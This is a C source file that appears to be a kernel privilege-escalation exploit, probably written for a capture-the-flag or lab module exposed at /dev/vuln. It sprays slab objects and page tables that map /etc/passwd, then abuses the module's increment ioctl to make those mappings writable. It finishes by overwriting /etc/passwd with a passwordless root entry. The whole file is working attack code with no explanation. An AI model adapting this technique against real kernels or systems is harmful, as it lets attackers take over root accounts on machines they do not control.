#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>
#define CMD_ALLOC   0x0268
#define CMD_INC     0x0298
#define CMD_SEL     0x01c1
#define CMD_DELETE  0x0831
static void fatal(const char *s) {
  perror(s);
  exit(1);
}
void pin_cpu(int cpu) {
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(cpu, &set);
  if (sched_setaffinity(0, sizeof(cpu_set_t), &set))
    fatal("sched_setaffinity");
}
int fd;
int module_alloc (size_t index) { return ioctl(fd, CMD_ALLOC , index); }
int module_inc() { return ioctl(fd, CMD_INC, 0); }
int module_sel(size_t index) { return ioctl(fd, CMD_SEL, index); }
int module_delete(size_t index) { return ioctl(fd, CMD_DELETE, index); }
#define MAX_OBJ_NUM 0x100
#define OBJ_SIZE    0x800
#define OBJS_PER_SLAB 8    // /sys/kernel/slab/obj/objs_per_slab
#define CPU_PARTIAL   24   // /sys/kernel/slab/obj/cpu_partial
char* PTI_TO_VIRT(size_t pgd, size_t pud, size_t pmd, size_t pte) {
  assert (pgd < 0x200 && pud < 0x200 && pmd < 0x200 && pte < 0x200);
  return (void*)((pgd << 39) + (pud << 30) + (pmd << 21) + (pte << 12));
}
void* mmap_by_pti(size_t pgd, size_t pud, size_t pmd, size_t pte) {
  void *p = (void*)PTI_TO_VIRT(pgd, pud, pmd, pte);
  void *q = mmap(p, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED|MAP_FIXED, -1, 0);
  assert (p == q);
  return p;
}
void* mmap_file_by_pti(int fd, size_t pgd, size_t pud, size_t pmd, size_t pte) {
  void *p = (void*)PTI_TO_VIRT(pgd, pud, pmd, pte);
  void *q = mmap(p, 0x1000, PROT_READ, MAP_SHARED|MAP_FIXED, fd, 0);
  assert (p == q);
  return p;
}
#define ENTRY_PER_TABLE 512
#define SPRAY_NUM 0x1800
#define DELTA 0x7f8
int main() {
  int etcfd = open("/etc/passwd", O_RDONLY);
  if (etcfd == -1) fatal("/etc/passwd");
  fd = open("/dev/vuln", O_RDWR);
  if (fd == -1) fatal("/dev/vuln");
  //pin_cpu(0);
  puts("[+] Spraying objects...");
  for (size_t i = 0; i < MAX_OBJ_NUM; i++)
    if (module_alloc(i % MAX_OBJ_NUM) != 0)
      fatal("module_alloc");
  if (module_sel(50) != 0)
    fatal("module_sel");
  puts("[+] Preparing pages...");
  for (size_t i = 0; i < SPRAY_NUM / ENTRY_PER_TABLE; i++) {
    for (size_t j = 0; j < ENTRY_PER_TABLE; j++) {
      mmap_file_by_pti(etcfd, 1, i, j, DELTA / 8);
      mmap_file_by_pti(etcfd, 1, i, j, (0x800 + DELTA) / 8);
    }
    volatile char c = *PTI_TO_VIRT(1, i, 0, DELTA / 8);
  }
  puts("[+] Returning page to buddy allocator");
  for (size_t i = 0; i < MAX_OBJ_NUM; i++)
    if (module_delete(i) != 0)
      fatal("module_delete");
  puts("[+] Spraying PTEs...");
  for (size_t i = 0; i < SPRAY_NUM / ENTRY_PER_TABLE; i++) {
    for (size_t j = 1; j < ENTRY_PER_TABLE; j++) {
      volatile char c;
      c = *PTI_TO_VIRT(1, i, j, DELTA / 8);
      c = *PTI_TO_VIRT(1, i, j, (0x800 + DELTA) / 8);
    }
  }
  puts("Go");
  if (module_inc() != 0)
    fatal("module_inc");
  if (module_inc() != 0)
    fatal("module_inc");
  // 101 --> 111
  int neko = open("/tmp/neko", O_RDWR | O_CREAT, 0666);
  write(neko, "root::0:0:root:/root:/bin/sh\n", 29);
  
  for (size_t i = 0; i < SPRAY_NUM / ENTRY_PER_TABLE; i++) {
    for (size_t j = 1; j < ENTRY_PER_TABLE; j++) {
      ssize_t s;
      lseek(neko, 0, SEEK_SET);
      s = read(neko, PTI_TO_VIRT(1, i, j, DELTA / 8), 29);
      if (s > 0) printf("wow: %ld, %ld\n", i, j);
      lseek(neko, 0, SEEK_SET);
      read(neko, PTI_TO_VIRT(1, i, j, (0x800 + DELTA) / 8), 29);
      if (s > 0) printf("wow: %ld, %ld (2)\n", i, j);
    }
  }
  puts("What's up?");
  return 0;
}
